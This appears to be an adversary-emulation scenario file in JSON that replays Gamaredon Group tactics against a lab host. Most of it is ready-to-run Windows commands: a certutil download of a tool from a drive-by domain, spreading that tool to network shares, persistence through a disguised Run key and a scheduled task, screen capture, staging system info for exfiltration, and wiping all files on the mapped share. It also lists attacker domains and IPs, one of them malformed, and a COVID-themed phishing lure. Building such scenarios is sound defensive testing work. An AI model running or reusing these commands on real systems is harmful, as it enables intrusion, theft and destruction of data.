{
    "meta_data": {
        "name": "gamaredon_group",
        "version": "v1.0.0",
        "title": "Gamaredon Group",
        "description": "This scenario emulates tactics employed by Gamaredon Group. The attacker investigates a machine and performs invasive operations.",
        "author": "Attack Content",
        "suggested_duration": 1653
    },
    "procedures": [
        {
            "tactic": "Infrastructure",
            "technique": "Actuator",
            "label": "actuator",
            "preconditions": {
                "tool": "state.tool_name"
            },
            "set_state": {
                "actuator": "postconditions.actuator.ret.registered_id"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "Interfaces",
            "label": "Interfaces",
            "preconditions": {
                "tool": "state.tool",
                "exfil": "state.exfil",
                "driveby": "state.driveby"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "DNS",
            "label": "DNS",
            "preconditions": {
                "tool": "state.tool",
                "exfil": "state.exfil",
                "driveby": "state.driveby"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "NGINX",
            "label": "NGINX",
            "preconditions": {
                "state.tool_name": "state.tool",
                "payload": "state.payload_name",
                "exfiltration": "state.exfil",
                "driveby": "state.driveby",
                "driveby_ctl": "state.chimera"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "Interfaces",
            "label": "Interfaces2",
            "preconditions": {
                "driveby": "state.driveby2"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "DNS",
            "label": "DNS2",
            "preconditions": {
                "driveby": "state.driveby2"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "NGINX",
            "label": "NGINX2",
            "preconditions": {
                "payload": "state.tool_name2",
                "driveby": "state.driveby2",
                "driveby_ctl": "state.chimera"
            }
        },
        {
            "tactic": "Infrastructure",
            "technique": "PayloadCheapride",
            "label": "Payload",
            "preconditions": {
                "tool": "state.tool"
            }
        },
        {
            "tactic": "InitialAccess",
            "technique": "SpearPhishingAttachment",
            "label": "spearPhishingAttachment",
            "preconditions": {
                "actuator": "state.actuator",
                "phishing": "state.phish_1",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1",
                "body": "Discover a whole new world!"
            }
        },
        {
            "tactic": "InitialAccess",
            "technique": "DriveByCompromise",
            "label": "driveByCompromise",
            "preconditions": {
                "actuator": "state.actuator",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            }
        },
        {
            "tactic": "Execution",
            "technique": "UserExecution",
            "label": "userExecution",
            "preconditions": {
                "actuator_id": "state.actuator",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            }
        },
        {
            "tactic": "c2",
            "technique": "WebProtocols",
            "label": "webProtocols_1",
            "preconditions": {
                "actuator_id": "state.actuator",
                "tool": "state.tool",
                "driveby": "state.driveby",
                "target": "state.target_1"
            },
            "tune": {
                "infra": true
            },
            "set_state": {
                "agent_tgt1": "postconditions.agent.ret.agent_id"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "SystemInformationDiscovery",
            "label": "systemInformationDiscovery1",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "SystemOwnerUserDiscovery",
            "label": "systemOwnerUserDiscovery1",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "cmd /c whoami /upn"
            }
        },
        {
            "tactic": "c2",
            "technique": "IngressToolTransfer",
            "label": "ingressToolTransfer1",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "cmd /c certutil.exe -urlcache -split -f http://${state.driveby_domain2}/${state.tool_name2}${state.temp_dir_name_1}\\${state.tool_name2}&& echo \" \""
            }
        },
        {
            "tactic": "LateralMovement",
            "technique": "TaintSharedContent",
            "label": "taintSharedContent",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target_1": "state.target_1",
                "target_2": "state.target_1"
            },
            "tune": {
                "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\"; robocopy${state.temp_dir_name_1}$fp${state.tool_name2}}"
            }
        },
        {
            "tactic": "Persistence",
            "technique": "RegistryRunKeysStartupFolder",
            "label": "addRunRegistryKey",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell &{$command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; echo \" \"; reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MicrosoftOfficeUpdater /d C:\\Users\\$username\\AppData\\Local\\Temp\\${state.tool_name2}/f}"
            }
        },
        {
            "tactic": "Execution",
            "technique": "NativeApi",
            "label": "nativeApi",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "FileAndDirectoryDiscovery",
            "label": "fileAndDirectoryDiscovery",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "where /R C:\\Users *doc* *docx* *xls* *xlsx* && echo \" \""
            }
        },
        {
            "tactic": "Execution",
            "technique": "ScheduledTaskExecution",
            "label": "scheduledTaskExecution",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute = $time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC minute /TN \"deepmost\", /TR \"cmd /c${state.temp_dir_name_1}\\${state.tool_name2}\" /ST $hourMinute /F}"
            }
        },
        {
            "tactic": "Collection",
            "technique": "ScreenCapture",
            "label": "screenCapture",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell $a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\\TEMP\\ModeAuto\\icons\"; mkdir $dir 2>$null; $d = \"$dir\\2031-09-13-06-00.jpg\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
            }
        },
        {
            "tactic": "Discovery",
            "technique": "ProcessDiscovery",
            "label": "processDiscovery",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "cmd /c tasklist /svc | findstr wmphost.exe && echo ' '"
            }
        },
        {
            "tactic": "Discovery",
            "technique": "PeripheralDeviceDiscovery",
            "label": "peripheralDeviceDiscovery",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell &{Get-PnpDevice | fl | findstr Caption; echo \" \"}"
            }
        },
        {
            "tactic": "DefenseEvasion",
            "technique": "MatchLegitimateNameOrLocation",
            "label": "matchLegitimateNameOrLocation",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell $a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\\IconsCache.db\"; systeminfo > $dir; echo \" \""
            }
        },
        {
            "tactic": "Exfiltration",
            "technique": "ExfiltrationOverC2Channel",
            "label": "exfiltrationOverC2Channel",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell $a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\"; gc $dir\\IconsCache.db; echo \" \""
            }
        },
        {
            "tactic": "DefenseEvasion",
            "technique": "FileDeletion",
            "label": "fileDeletionLocal",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell &{$a = quser; $b = Out-String -inputobject $a; $user = $b.split(\"`n>\")[2].split()[0]; $dir = \"C:\\Users\\$user\\AppData\\Local\"; rm $dir\\IconsCache.db; echo \" \"}"
            }
        },
        {
            "tactic": "DefenseEvasion",
            "technique": "FileDeletionPowershell",
            "label": "fileDeletionShare",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            },
            "tune": {
                "command": "powershell &{$fp = \"$($(Get-PSDrive | where{$_.DisplayRoot -match '\\\\'}).DisplayRoot)\"; rm $fp\\*; echo \" \"}"
            }
        },
        {
            "tactic": "Utility",
            "technique": "AgentExit",
            "label": "AgentExit",
            "preconditions": {
                "agent": "state.agent_tgt1",
                "tool": "state.tool",
                "target": "state.target_1"
            }
        }
    ],
    "iocs": {
        "domain": [
            "admin-ru.ru",
            "adobe.update-service.net",
            "apploadapp.webhop.me",
            "brokbridge.com",
            "cat.gotdns.ch",
            "check-update.ru",
            "childrights.in.ua",
            "conhost.myftp.org",
            "docdownload.ddns.net",
            "downloads.email-attachments.ru",
            "downloads.file-attachments.ru",
            "dyndownload.serveirc.com",
            "e.muravej.ua",
            "email-attachments.ru",
            "file-attachments.ru",
            "freefiles.myftp.biz",
            "getmyfile.webhop.me",
            "googlefiles.serveftp.com",
            "grom56.ddns.net",
            "grom90.ddns.net",
            "hrome-update.ru",
            "hrome-updater.ru",
            "loaderskypetm.webhop.me",
            "loadsoulip.serveftp.com",
            "mail.file-attachments.ru",
            "mails.redirectme.net",
            "mars-ru.ru",
            "msrestore.ru",
            "oficialsite.webhop.me",
            "parkingdoma.webhop.me",
            "poligjong.webhop.me",
            "polistar.ddns.net",
            "proxy-spread.ru",
            "rms.admin-ru.ru",
            "samotsvety.com.ua",
            "skypeemocache.ru",
            "skypeupdate.ru",
            "spbpool.ddns.net",
            "spread-service.ru",
            "spread-ss.ru",
            "spread-updates.ru",
            "stor.tainfo.com.ua",
            "tortilla.sytes.net",
            "ukrnet.serveftp.com",
            "ukrway.galaktion.ru",
            "umachka.ua",
            "update-service.net",
            "updatesp.ddns.net",
            "updateviber.sytes.net",
            "webclidie.webhop.me",
            "win-restore.ru",
            "winloaded.sytes.net",
            "winupdateloader.ru",
            "www.file-attachments.ru",
            "www.win-restore.ru",
            "yfperoliz.webhop.me"
        ],
        "ip": [
            "176.119.147.225/24",
            "176.57.215.115/24",
            "54.0.2952.64/24",
            "168.119.228.72/24",
            "92.242.62.131/24",
            "87.249.53.178/24",
            "89.223.65.220/24",
            "78.40.219.12/24",
            "188.225.86.146/24",
            "188.225.45.240/24",
            "37.77.105.102/24",
            "87.249.54.15/24",
            "92.53.97.112/24",
            "217.25.94.152/24",
            "188.225.58.51/24",
            "188.225.25.7/24",
            "89.223.120.224/24",
            "188.225.47.250/24",
            "87.249.53.116/24",
            "87.249.53.216/24",
            "87.249.44.220/24",
            "87.249.49.13/24",
            "87.249.44.41/24",
            "89.223.125.10/24"
        ],
        "binary": [
            "ChkFlsh.exe",
            "wmphost.exe",
            "chrome-xvnc-v5517.exesetting.exe",
            "AdapterTroubleshooter.exe",
            "Cookies.exe",
            "descend.exe",
            "deep-sunken.exe",
            "backed.exe",
            "z4z05jn4.egf.exe",
            "defiant.exe",
            "deep-green.exe"
        ]
    },
    "spec": {
        "emaillist": "@('Janice Durham <janice.durham@site.com>', 'Darryl Richmond <darryl.richmond@site.com>', 'Nelda Rios <nelda.rios@site.com>', 'Joanna Wilkerson <joanna.wilkerson@site.com>')",
        "phishing": {
            "1": {
                "ioc-server_addr": "200.200.200.201",
                "from_addr": "darryl.richmond@site.com",
                "to_addrs": "janice.durham@site.com",
                "cc": "",
                "bcc": "",
                "subject": "COVID (Weekly Epi)",
                "body_subtype": "plain",
                "attach": "",
                "username": "janice.durham",
                "password": "",
                "port": "25"
            }
        },
        "tool": {
            "1": {
                "name": "cheapride_v1",
                "beacon": "30",
                "jitter": "90",
                "ioc-ip_callback": "122.49.200.108/24",
                "ioc-domain_callback": "inf0rm.bed1rcati.com",
                "ioc-binary_payload_name": "form.doc.exe"
            },
            "2": {
                "name": "netbugc.exe"
            }
        },
        "chimera": {
            "api-control_ip": "10.10.200.60"
        },
        "exfil": {
            "1": {
                "ioc-ip_exfil": "161.135.1.25/24",
                "ioc-domain_exfil": "deepwalterhorizon.com"
            }
        },
        "driveby": {
            "1": {
                "ioc-ip_driveby": "161.135.1.22/24",
                "ioc-domain_driveby": "texaspumps.us"
            },
            "2": {
                "ioc-ip_driveby": "157.32.19.24/24",
                "ioc-domain_driveby": "arkansaspumps.us"
            }
        },
        "targets": {
            "1": {
                "exfil_file": "file.doc",
                "payload_destination": "C:\\Windows\\Temp",
                "ioc-temp_dir": "C:\\Windows\\debug\\WIA",
                "query": {
                    "filter": {
                        "hostname": "dev-win10-3"
                    }
                }
            }
        }
    },
    "state": {
        "tool_name": "spec.tool.1.name",
        "tool_name2": "spec.tool.2.name",
        "payload_name": "spec.tool.1.ioc-binary_payload_name",
        "tool": "spec.tool.1",
        "exfil": "spec.exfil.1",
        "driveby": "spec.driveby.1",
        "driveby2": "spec.driveby.2",
        "driveby_domain": "spec.driveby.1.ioc-domain_driveby",
        "driveby_domain2": "spec.driveby.2.ioc-domain_driveby",
        "chimera": "spec.chimera",
        "phish_1": "spec.phishing.1",
        "target_1": "spec.targets.1",
        "temp_dir_name_1": "spec.targets.1.ioc-temp_dir"
    }
}